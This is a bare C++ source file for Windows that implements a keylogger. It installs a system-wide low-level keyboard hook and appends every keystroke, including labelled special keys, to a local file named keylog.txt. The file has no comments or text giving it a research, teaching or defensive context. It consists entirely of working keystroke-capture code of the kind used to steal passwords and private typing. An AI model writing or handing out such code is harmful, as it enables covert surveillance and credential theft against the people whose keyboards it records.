#include <windows.h>
#include <fstream>
#include <iostream>

std::ofstream logFile;

void logKeyStroke(int key) {
    if (key >= 32 && key <= 126) {  // Printable ASCII characters
        logFile << static_cast<char>(key);
    } else if (key == VK_RETURN) {
        logFile << "[ENTER]";
    } else if (key == VK_SPACE) {
        logFile << " ";
    } else if (key == VK_TAB) {
        logFile << "[TAB]";
    } else if (key == VK_BACK) {
        logFile << "[BACKSPACE]";
    } else if (key == VK_ESCAPE) {
        logFile << "[ESC]";
    } else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {
        logFile << "[SHIFT]";
    } else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) {
        logFile << "[CTRL]";
    } else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) {
        logFile << "[ALT]";
    } else {
        logFile << "[KEY:" << key << "]";
    }
    logFile.flush();
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            logKeyStroke(pKeyBoard->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    logFile.open("keylog.txt", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file!" << std::endl;
        return 1;
    }

    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    if (hhkLowLevelKybd == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hhkLowLevelKybd);
    logFile.close();

    return 0;
}